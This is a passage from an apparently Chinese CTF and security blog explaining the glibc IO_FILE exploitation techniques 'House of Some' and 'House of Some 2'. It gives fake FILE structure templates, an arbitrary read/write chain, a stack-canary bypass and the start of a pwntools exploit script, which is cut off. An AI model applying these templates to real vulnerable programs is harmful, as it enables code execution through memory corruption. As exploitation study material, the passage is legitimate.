_chain</span><br><span class="line">    0xd8: _IO_wfile_jumps, # vtable</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line">fake_wide_data = flat(&#123;</span><br><span class="line">    0xe0: _IO_file_jumps - 0x48,</span><br><span class="line">    0x18: 0,</span><br><span class="line">    0x20: 1,</span><br><span class="line">    0x30: 0,</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h3><p>利用<code>_IO_write_base</code>和<code>_IO_write_ptr</code>实现任意地址读，这里给出构造模板，具体原理网上有很多教程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_file_write = flat(&#123;</span><br><span class="line">    0x00: 0x800 | 0x1000, # _flags</span><br><span class="line">    </span><br><span class="line">    0x20: 需要泄露的起始地址, # _IO_write_base</span><br><span class="line">    0x28: 需要泄露的终止地址, # _IO_write_ptr</span><br><span class="line"></span><br><span class="line">    0x70: 1, # _fileno</span><br><span class="line">    0x68: 下一个调用的fake file地址, # _chain</span><br><span class="line">    0xd8: _IO_file_jumps, # vtable</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><p>已经有了任意地址读、任意地址写的fake file构造，那么只需要将其用<code>_chain</code>串起来就可以达成强大的攻击效果</p>
<p>将House of some的攻击流程分成4步（RWRWR过程）（这也是一个广泛的思路，拥有任意地址写就不止一个方法了）</p>
<ul>
<li>第一步 任意地址写<code>_chain</code>，这里可以写<code>_IO_list_all</code>或者stdin、stdout、stderr的<code>_chain</code>位置，在这一步需要在可控地址上布置一个任意地址写的Fake file，之后将Fake file地址写入上述位置</li>
<li>第二步 扩展fake file链条并泄露栈地址，在第一步的中，我们只有一个fake file，并不能完成更复杂的操作，所以这一步我们需要写入两个fake file，一个用于泄露<code>environ</code>内的值（即栈地址），另一个用于写入下一个fake file</li>
<li>第三步 泄露栈内数据，并寻找ROP起始地址，这一步同样需要写入两个fake file，一个任意地址读，读取栈上内存，另一个任意地址写，向栈上写ROP</li>
<li>第三步 写入ROP，实现栈上ROP攻击</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/House-of-some.png" alt=""></p>
<h1 id="house-of-some2"><a href="#house-of-some2" class="headerlink" title="house of some2"></a>house of some2</h1><h2 id="概要-23"><a href="#概要-23" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Some 2是独立的一条IO_FILE利用链，主要关注的函数是<code>_IO_wfile_jumps_maybe_mmap</code>中的<code>_IO_wfile_underflow_maybe_mmap</code></p>
<p><strong>利用条件:</strong></p>
<ol>
<li>已知libc地址</li>
<li>可控地址(可写入fake file)</li>
<li>可控stdout指针或者<code>_IO_2_1_stdout_</code>结构体</li>
<li>程序具有printf或者puts输出函数</li>
</ol>
<p><strong>利用效果:</strong>任意地址读写</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-23"><a href="#原理-23" class="headerlink" title="原理"></a>原理</h2><p>首先我们先关注<code>_IO_wfile_underflow_maybe_mmap</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_maybe_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This is the first read attempt.  Doing the underflow will choose mmap</span></span><br><span class="line"><span class="comment">     or vanilla operations and then punt to the chosen underflow routine.</span></span><br><span class="line"><span class="comment">     Then we can punt to ours.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_underflow_maybe_mmap (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> _IO_WUNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数最后调用了<code>_wide_data</code>内的虚表<code>_IO_WUNDERFLOW</code></p>
<p>那么继续深入<code>_IO_file_underflow_maybe_mmap</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_underflow_maybe_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This is the first read attempt.  Choose mmap or vanilla operations</span></span><br><span class="line"><span class="comment">     and then punt to the chosen underflow routine.  */</span></span><br><span class="line">  decide_maybe_mmap (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数最后调用了FILE的虚表<code>_IO_UNDERFLOW</code></p>
<p>继续深入<code>decide_maybe_mmap</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">decide_maybe_mmap</span> <span class="params">(FILE *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We use the file in read-only mode.  This could mean we can</span></span><br><span class="line"><span class="comment">     mmap the file and use it without any copying.  But not all</span></span><br><span class="line"><span class="comment">     file descriptors are for mmap-able objects and on 32-bit</span></span><br><span class="line"><span class="comment">     machines we don&#x27;t want to map files which are too large since</span></span><br><span class="line"><span class="comment">     this would require too much virtual memory.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">stat64_t64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_SYSSTAT (fp, &amp;st) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; S_ISREG (st.st_mode) &amp;&amp; st.st_size != <span class="number">0</span></span><br><span class="line">      <span class="comment">/* Limit the file size to 1MB for 32-bit machines.  */</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">sizeof</span> (<span class="type">ptrdiff_t</span>) &gt; <span class="number">4</span> || st.st_size &lt; <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">      <span class="comment">/* Sanity check.  */</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_offset == _IO_pos_BAD || fp-&gt;_offset &lt;= st.st_size))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Try to map the file.  */</span></span><br><span class="line">      <span class="type">void</span> *p;</span><br><span class="line">      ... 这里主要就是做了mmap</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We couldn&#x27;t use mmap, so revert to the vanilla file operations.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt;= <span class="number">0</span>)</span><br><span class="line">    _IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数有一个关键的<code>_IO_SYSSTAT</code>调用，以及，在这个函数最后会恢复FILE和<code>_wide_data</code>的虚表</p>
<p>整理一下可以知道，如果一个FILE进入了函数<code>_IO_wfile_underflow_maybe_mmap</code>，那么他将会运行如下的流程</p>
<ol>
<li><code>_IO_SYSSTAT(fp, &amp;st)</code>调用虚表，传入栈指针</li>
<li>decide_maybe_mmap函数结束，恢复两个虚表</li>
<li><code>_IO_UNDERFLOW (fp)</code>调用虚表</li>
<li><code>_IO_WUNDERFLOW (fp)</code>调用虚表</li>
</ol>
<p>以及补充的条件</p>
<p>在<code>_IO_file_jumps</code>虚表的<code>_IO_UNDERFLOW</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure>
<p>这一步，三个参数都可控，也就是可以写入任意地址</p>
<p>最后我们需要补充一下<code>IO_jump_t</code>结构体的全貌</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/* offset      |    size */  type = struct _IO_jump_t &#123;</span><br><span class="line">/* 0x0000      |  0x0008 */    size_t __dummy;</span><br><span class="line">/* 0x0008      |  0x0008 */    size_t __dummy2;</span><br><span class="line">/* 0x0010      |  0x0008 */    _IO_finish_t __finish;</span><br><span class="line">/* 0x0018      |  0x0008 */    _IO_overflow_t __overflow;</span><br><span class="line">/* 0x0020      |  0x0008 */    _IO_underflow_t __underflow;</span><br><span class="line">/* 0x0028      |  0x0008 */    _IO_underflow_t __uflow;</span><br><span class="line">/* 0x0030      |  0x0008 */    _IO_pbackfail_t __pbackfail;</span><br><span class="line">/* 0x0038      |  0x0008 */    _IO_xsputn_t __xsputn;</span><br><span class="line">/* 0x0040      |  0x0008 */    _IO_xsgetn_t __xsgetn;</span><br><span class="line">/* 0x0048      |  0x0008 */    _IO_seekoff_t __seekoff;</span><br><span class="line">/* 0x0050      |  0x0008 */    _IO_seekpos_t __seekpos;</span><br><span class="line">/* 0x0058      |  0x0008 */    _IO_setbuf_t __setbuf;</span><br><span class="line">/* 0x0060      |  0x0008 */    _IO_sync_t __sync;</span><br><span class="line">/* 0x0068      |  0x0008 */    _IO_doallocate_t __doallocate;</span><br><span class="line">/* 0x0070      |  0x0008 */    _IO_read_t __read;</span><br><span class="line">/* 0x0078      |  0x0008 */    _IO_write_t __write;</span><br><span class="line">/* 0x0080      |  0x0008 */    _IO_seek_t __seek;</span><br><span class="line">/* 0x0088      |  0x0008 */    _IO_close_t __close;</span><br><span class="line">/* 0x0090      |  0x0008 */    _IO_stat_t __stat;</span><br><span class="line">/* 0x0098      |  0x0008 */    _IO_showmanyc_t __showmanyc;</span><br><span class="line">/* 0x00a0      |  0x0008 */    _IO_imbue_t __imbue;</span><br><span class="line"></span><br><span class="line">                               /* total size (bytes):  168 */</span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<h3 id="第一次猜想"><a href="#第一次猜想" class="headerlink" title="第一次猜想"></a>第一次猜想</h3><p>在printf和puts函数中，最后会调用stdout的<code>__xsputn</code>虚表的入口</p>
<p>如果我们使得<code>__xsputn</code>的偏移直接指向<code>__underflow</code>呢？</p>
<p>那么就会得到如下的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__xsputn -&gt; __underflow</span><br><span class="line">__stat   -&gt; __write</span><br></pre></td></tr></table></figure>
<p>此时，修改stdout的虚表为<code>_IO_wfile_jumps_maybe_mmap-0x18</code></p>
<p>在上述调用过程中<code>_IO_SYSSTAT(fp, &amp;st)</code>这个函数就会变成<code>write(fp, &amp;st, ??)</code></p>
<p>如果我们能够控制rdx就好了，这里就能做到栈数据泄露</p>
<h3 id="rdx的控制"><a href="#rdx的控制" class="headerlink" title="rdx的控制"></a>rdx的控制</h3><p>很遗憾，在上述函数过程中，并没有涉及rdx的操作(注: 以Ubuntu GLIBC 2.35-0ubuntu3.1为例，后文相同)</p>
<p>能够控制的也就只有后续调用的<code>_IO_UNDERFLOW (fp)</code>中的<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>可以控制，由于<code>decide_maybe_mmap</code>会强制恢复虚表，所以这里我们不用担心篡改虚表带来的影响</p>
<p>如果rdx不可控直接执行<code>write(fp, &amp;st, ??)</code>会怎么样，返回0或者非0</p>
<p>那么回到<code>decide_maybe_mmap</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_SYSSTAT (fp, &amp;st) == <span class="number">0</span></span><br><span class="line">    &amp;&amp; S_ISREG (st.st_mode) &amp;&amp; st.st_size != <span class="number">0</span></span><br><span class="line">...</span><br><span class="line">   &amp;&amp; (fp-&gt;_offset == _IO_pos_BAD || fp-&gt;_offset &lt;= st.st_size))</span><br><span class="line">  &#123;</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里判断，如果<code>_IO_SYSSTAT (fp, &amp;st)</code>返回0，那么直接就不会进入if，如果返回不为0，我们看看<code>S_ISREG</code>的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>	__S_ISTYPE(mode, mask)	(((mode) &amp; __S_IFMT) == (mask))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	S_ISREG(mode)	 __S_ISTYPE((mode), __S_IFREG)</span></span><br></pre></td></tr></table></figure>
<p>不必关注详细的值，这里可以看到最后判断采用的是==判断，由于栈上数据的限制，这里通过判断的概率不高</p>
<p>以及还有<code>st.st_size != 0</code>判断，在没有正确执行stat逻辑，栈维持原貌的情况下，这个if通过概率不高</p>
<p>如果还高，可以控制<code>fp-&gt;_offset == _IO_pos_BAD || fp-&gt;_offset &lt;= st.st_size</code>为假即可</p>
<p>那么就能顺利的执行完<code>decide_maybe_mmap</code>，并且<strong>保留伪造的fp内容没有任何变动</strong></p>
<p>接下来就是调用<code>_IO_file_jumps</code>虚表的<code>_IO_UNDERFLOW</code>，操作执行read</p>
<p>这里，我们可以设置，注意fake_file_start就是我们当前控制的fp地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_buf_base = fake_file_start</span><br><span class="line">_IO_buf_end  = fake_file_start + <span class="number">0x1c8</span> <span class="comment">// 这里的1c8包括了widedata的长度</span></span><br></pre></td></tr></table></figure>
<p>那么，这里我们就能再次重新复写fake，并扩大可控长度，widedata都可控了</p>
<p>回到上面执行流程，接下来就会执行<code>_IO_WUNDERFLOW (fp)</code>这个虚表函数了</p>
<p>然而，上述我们通过underflow重新控制了fp，也就是接下来的这个虚表函数，我们也是可控的</p>
<p>这里我们控制为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_WUNDERFLOW(fp) -&gt; _IO_wfile_underflow_maybe_mmap</span><br></pre></td></tr></table></figure>
<h3 id="回到起点"><a href="#回到起点" class="headerlink" title="回到起点"></a>回到起点</h3><p>我们再次回到了起点，但是这次不一样了</p>
<p>在上一个小节，其实我们已经控制了rdx，因为<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>的第三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdx = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span><br></pre></td></tr></table></figure>
<p>此时，此时我们依然有这四个执行流程</p>
<ol>
<li><code>_IO_SYSSTAT(fp, &amp;st)</code>调用虚表，传入栈指针</li>
<li>decide_maybe_mmap函数结束，恢复两个虚表</li>
<li><code>_IO_UNDERFLOW (fp)</code>调用虚表</li>
<li><code>_IO_WUNDERFLOW (fp)</code>调用虚表</li>
</ol>
<p>不同的是，此时<code>_IO_SYSSTAT(fp, &amp;st)</code>可以被指向任意的虚表函数，因为在第二次控制fp的时候，我们又一次覆写了FILE的vtable</p>
<p>那么此时我们就可以控制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_SYSSTAT(fp, &amp;st) -&gt; _IO_new_file_read(fp, &amp;st, rdx)</span><br></pre></td></tr></table></figure>
<p>我们已经成功完成了栈溢出</p>
<h3 id="还有高手？Canary"><a href="#还有高手？Canary" class="headerlink" title="还有高手？Canary"></a>还有高手？Canary</h3><p>很不幸，decide_maybe_mmap函数开启了canary，我们没办法在没有泄露栈的情况下，完成栈溢出</p>
<p>由于fileno的设置，无法完成write(1,stack,rdx)的操作，真的没有办法的了吗</p>
<p>那么接下来，有请<code>_IO_default_xsputn</code>和<code>_IO_default_xsgetn</code></p>
<p>阅读这两个函数源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">char</span> *s = (<span class="type">char</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = fp-&gt;_IO_read_ptr;</span><br><span class="line">	      <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	      <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		*s++ = *p++;</span><br><span class="line">	      fp-&gt;_IO_read_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	    more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __underflow (fp) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以知道，这是对于fp内的缓冲区的操作，可以关注到的是这里函数内有两个关键的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_default_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n) </span><br><span class="line">    ==&gt; __mempcpy(data, fp-&gt;_IO_read_ptr, n);</span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n) </span><br><span class="line">    ==&gt; __mempcpy (f-&gt;_IO_write_ptr, data, n);</span><br></pre></td></tr></table></figure>
<p>如果能够保证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr == n</span><br><span class="line">f-&gt;_IO_write_end - f-&gt;_IO_write_ptr == n</span><br></pre></td></tr></table></figure>
<p>就不会进入<code>__underflow</code>和<code>_IO_OVERFLOW</code>降低其他函数的干扰</p>
<p>这个时候就能衍生出一个大胆的想法，如果我们先将栈复制一份到可控的区域，再通过偏移写入，最后再拷贝回到栈内，那么我们就能完美的绕过canary并且，并不需要泄露canary</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/houseofsome2.png" alt=""></p>
<h2 id="模板-1"><a href="#模板-1" class="headerlink" title="模板"></a>模板</h2><p>相关偏移为Ubuntu GLIBC 2.35-0ubuntu3.1版本glibc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line">io = process(<span class="string">&quot;./demo&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;[+] printf: &quot;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;printf_addr: <span class="subst">&#123;printf_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size&gt; &quot;</span>, tob(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size&gt; &quot;</span>, tob(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;addr&gt; &quot;</span>, tob(addr))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;content&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span 